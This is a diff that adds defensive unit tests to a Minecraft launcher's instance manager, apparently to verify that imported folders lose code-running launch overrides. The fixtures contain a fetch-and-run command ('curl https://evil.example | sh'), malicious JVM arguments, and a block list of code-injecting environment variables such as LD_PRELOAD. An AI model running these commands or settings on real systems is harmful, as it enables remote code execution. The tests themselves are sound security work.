@@ -203,6 +203,83 @@ describe('InstanceManager', () => {
     expect(again.get(inPlace.id)).toMatchObject({ external: true, path: src, state: 'ok' })
   })
 
+  it('does not import launch overrides that run code, and lists them in the review', async () => {
+    const m = manager()
+    await m.load()
+    const src = path.join(root, 'shared', 'Pack')
+    await mkdir(path.join(src, '.amethyst'), { recursive: true })
+    const overrides = {
+      preLaunchCommand: 'curl https://evil.example | sh',
+      wrapperCommand: '/tmp/wrap.sh',
+      javaPath: '/tmp/evil/bin/java',
+      jvmArgs: ['-Xmx4G', '-XX:+UseG1GC', '-XX:G1HeapRegionSize=32M', '-Dfml.ignoreInvalidMinecraftCertificates=true', '-javaagent:agent.jar', '-XX:OnError=sh x.sh', '-XX:ErrorFile=x', '@args.txt', '-Dlog4j.configurationFile=evil.xml'],
+      env: { DYLD_INSERT_LIBRARIES: '/tmp/x.dylib', JAVA_TOOL_OPTIONS: '-javaagent:a.jar', MESA_GL_VERSION_OVERRIDE: '4.1' },
+      gameArgs: ['--demo'],
+    }
+    const meta = { schemaVersion: 1, id: 'shared-pack-1', name: 'Pack', runtime: { minecraft: '1.21.1' }, overrides }
+    await writeFile(path.join(src, '.amethyst', 'instance.json'), JSON.stringify(meta))
+
+    const candidate = await m.inspectFolder(src)
+    expect(candidate.kind).toBe('amethyst')
+    const removed = candidate.removedLaunchSettings ?? []
+    expect(removed.find((r) => r.startsWith('Pre-launch command'))).toContain('curl')
+    expect(removed.find((r) => r.startsWith('Wrapper command'))).toContain('/tmp/wrap.sh')
+    expect(removed.find((r) => r.startsWith('Java path'))).toContain('/tmp/evil')
+    const jvm = removed.find((r) => r.startsWith('Java arguments')) ?? ''
+    for (const a of ['-javaagent:agent.jar', '-XX:OnError=sh x.sh', '-XX:ErrorFile=x', '@args.txt', '-Dlog4j.configurationFile=evil.xml']) expect(jvm).toContain(a)
+    expect(jvm).not.toContain('-Xmx4G')
+    expect(removed.find((r) => r.startsWith('Environment'))).toBe('Environment variables: DYLD_INSERT_LIBRARIES, JAVA_TOOL_OPTIONS')
+
+    const expected = { jvmArgs: ['-Xmx4G', '-XX:+UseG1GC', '-XX:G1HeapRegionSize=32M', '-Dfml.ignoreInvalidMinecraftCertificates=true'], env: { MESA_GL_VERSION_OVERRIDE: '4.1' }, gameArgs: ['--demo'] }
+    const copied = await m.import({ path: src, mode: 'copy' })
+    expect(copied.overrides).toEqual(expected)
+    expect(JSON.parse(await readFile(path.join(copied.path, '.amethyst', 'instance.json'), 'utf8')).overrides).toEqual(expected)
+
+    const inPlace = await m.import({ path: src, mode: 'in-place' })
+    expect(inPlace.overrides).toEqual(expected)
+    // The folder's own file no longer carries them either.
+    expect(JSON.parse(await readFile(path.join(src, '.amethyst', 'instance.json'), 'utf8')).overrides).toEqual(expected)
+  })
+
+  it('rejects code-injecting environment variables in overrides', async () => {
+    const m = manager()
+    await m.load()
+    const inst = await m.create({ name: 'Env', runtime: { minecraft: '1.21.1' } })
+    for (const key of ['DYLD_INSERT_LIBRARIES', 'LD_PRELOAD', 'JAVA_TOOL_OPTIONS', '_JAVA_OPTIONS', 'JDK_JAVA_OPTIONS', 'NODE_OPTIONS', 'ELECTRON_RUN_AS_NODE', 'dyld_library_path']) {
+      // oxlint-disable-next-line no-await-in-loop -- one rejected patch per key
+      await expect(m.update(inst.id, { overrides: { env: { [key]: 'x' } } })).rejects.toMatchObject({ code: 'EINVALID_ARGUMENT', message: expect.stringContaining(key) })
+    }
+    expect((await m.update(inst.id, { overrides: { env: { MESA_DEBUG: '1' } } })).overrides.env).toEqual({ MESA_DEBUG: '1' })
+    // A file edited by hand keeps its safe keys and loses the unsafe ones.
+    await m.flush()
+    const file = path.join(inst.path, '.amethyst', 'instance.json')
+    const disk = JSON.parse(await readFile(file, 'utf8'))
+    disk.overrides.env = { MESA_DEBUG: '1', DYLD_INSERT_LIBRARIES: '/tmp/x.dylib' }
+    await writeFile(file, JSON.stringify(disk))
+    const again = manager()
+    await again.load()
+    expect(again.get(inst.id).overrides.env).toEqual({ MESA_DEBUG: '1' })
+  })
+
+  it('refuses to import a folder that contains the data root, and never reuses an id that differs only by case', async () => {
+    const m = manager()
+    await m.load()
+    // `root` holds the data root (root/data).
+    expect((await m.inspectFolder(root)).check).toBe('contains-data-root')
+    await expect(m.import({ path: root, mode: 'copy', runtime: { minecraft: '1.21.1' } })).rejects.toMatchObject({ code: 'EIMPORT_REJECTED' })
+
+    const first = path.join(root, 'ext', 'A')
+    await mkdir(path.join(first, '.amethyst'), { recursive: true })
+    await writeFile(path.join(first, '.amethyst', 'instance.json'), JSON.stringify({ schemaVersion: 1, id: 'Shared-Id-1', name: 'A', runtime: { minecraft: '1.21.1' } }))
+    const a = await m.import({ path: first, mode: 'in-place' })
+    expect(a.id).toBe('Shared-Id-1')
+    const second = path.join(root, 'ext', 'B')
+    await mkdir(path.join(second, '.amethyst'), { recursive: true })
+    await writeFile(path.join(second, '.amethyst', 'instance.json'), JSON.stringify({ schemaVersion: 1, id: 'shared-id-1', name: 'B', runtime: { minecraft: '1.21.1' } }))
+    const b = await m.import({ path: second, mode: 'in-place' })
+    expect(b.id.toLowerCase()).not.toBe('shared-id-1')
+  })
+
   it('lists unreadable metadata as broken without touching it, and repairs on request', async () => {
     const m = manager()
     await m.load()
